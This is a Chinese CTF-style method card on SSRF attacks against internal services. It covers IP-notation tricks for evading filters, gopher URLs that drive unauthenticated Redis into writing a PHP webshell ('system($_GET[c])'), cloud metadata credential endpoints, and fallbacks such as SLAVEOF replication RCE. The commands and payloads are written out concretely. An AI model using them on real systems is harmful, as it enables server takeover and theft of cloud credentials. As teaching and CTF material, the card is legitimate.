---
title: 方法卡 · SSRF 内网穿透（IP 变形 / gopher 打 Redis / 云元数据）
category: web
tags: [ssrf, gopher, redis 未授权, 云元数据, ip 变形, 内网探测]
signals: [url 或 image 参数由服务端抓取, 回显里能看到目标 URL 的响应, webhook 与在线预览类功能, 只允许 http 协议而 file 被拦, 提示服务器可访问内网或有 redis, 返回 169.254.169.254 相关内容]
difficulty: medium
source: kb/web/ssrf-internal-access.md
tools: [curl, burpsuite, gopherus, python]
updated: 2026-11-03
---

# 方法卡 · SSRF 内网穿透（IP 变形 / gopher 打 Redis / 云元数据）

## 适用场景

- 存在 `?url=`、`?image=`、`?avatar=`、`?link=` 参数，服务端会"抓取"该地址；
- webhook / 回调 / 导入 URL / 在线预览功能，可以让**服务器**发起请求；
- 返回里能直接看到目标响应（回显 SSRF），或只有延时/外带（盲 SSRF）；
- 题面提示"服务器可以访问内网""有 Redis""只允许 http 协议"；
- 关键词：SSRF、内网、元数据、curl、redis、gopher。

## 前置条件

- 确认是服务端发起请求（不是浏览器跳转）：把 URL 指向自己可控的观测点，看是否收到请求；
- 探明过滤：哪些协议（`file`/`gopher`/`dict`）、哪些地址（`127.0.0.1`/`169.254.*`）被拦；
- 回显型可直接读内容；盲 SSRF 需要 DNS / HTTP 外带，或靠时间差判定；
- 本卡脚本**离线**：只生成 IP 变形、gopher-RESP 串、元数据与探测清单，不发包。

## 步骤

1. **判类型**：回显型先 `--probe` 出的矩阵逐条打；盲型换成自己的观测地址确认可达。
2. **探内网端口**：`http://127.0.0.1:6379/`（Redis 会回 `-ERR unknown command`）、3306、9000(PHP-FPM)、8080。
3. **探云元数据**：`--meta` 列出的 AWS / GCP / 阿里云 / Azure / 腾讯云端点，凭据路径最值钱。
4. **Redis 未授权**：先用 `dict://127.0.0.1:6379/info` 验证；再 `--write /var/www/html/shell.php` 生成 `CONFIG SET dir` + `dbfilename` + `SET` + `SAVE` 的 gopher 串。
5. **绕过过滤**：`--ip` 出全部变形（十进制 `2130706433`、`0x7f000001`、`127.1`、`[::1]`、`localhost`、`x.nip.io`）；再试 302 跳转、DNS rebinding、`http://127.0.0.1@evil.com` 解析差异。
6. **回连验证**：拿到 webshell 后访问 `?c=id`；盲 SSRF 用 `--check` 找被拦词后改写法。

```powershell
.\.venv\Scripts\python.exe kb/_methods/scripts/ssrf_internal.py --ip 127.0.0.1
.\.venv\Scripts\python.exe kb/_methods/scripts/ssrf_internal.py --redis 'CONFIG GET dir' --port 6379
.\.venv\Scripts\python.exe kb/_methods/scripts/ssrf_internal.py --write /var/www/html/shell.php --content '<?php system($_GET[c]); ?>'
.\.venv\Scripts\python.exe kb/_methods/scripts/ssrf_internal.py --meta all
```

## 脚本

脚本路径：`kb/_methods/scripts/ssrf_internal.py`（纯标准库，离线）

- `ip_variants(ip)`：同一地址的十进制/十六进制/八进制/简写/IPv6 映射/nip.io 等写法，用于绕过字符串黑名单；
- `resp_cmd(*cmds)` → `gopher_url(payload, host, port)`：Redis 命令转 RESP，再转 `gopher://host:port/_<urlencoded>`（换行必须编码）；
- `redis_file_url(path, content)`：生成 `CONFIG SET dir/dbfilename` + `SET` + `SAVE` 的写文件 gopher URL；
- `metadata_list(provider)` / `probe_list(host, ports)` / `check_blocked(text)`：元数据清单、端口矩阵、黑名单提示；
- `--selftest`：6 组固定断言，退出码 0 才算过。

## 失效场景

- **`gopher` 前缀写错**：必须是 `gopher://host:port/_<payload>`，且 `%0d%0a` 要编码；漏掉 `/_` 或直接写裸换行，Redis 一律判协议错误。
- **Redis 保护模式 / CONFIG 被改名**：`CONFIG` 被 `rename-command` 禁用时写文件失败，改走 `SLAVEOF` 主从复制 RCE 或 `MODULE LOAD`。
- **目标目录不可写**：`CONFIG SET dir` 指向的目录无写权限或 `SAVE` 被禁（`stop-writes-on-bgsave-error`），写 webshell 直接失败。
- **只允许 http 且不跟随跳转**：gopher/dict 全废，只能打内网 HTTP 应用的自身漏洞。
- **云元数据需特定 header**：GCP 要求 `Metadata-Flavor: Google`，SSRF 无法自定义头时只能靠跳转绕过。
- **出网被封（盲 SSRF）**：目标无外网出口时 DNS 外带失效，只能用时间差或内网回显判断。

## 相关文档

- `kb/web/ssrf-internal-access.md`（原文：gopherus 用法、IP 变形与 DNS rebinding 变体）
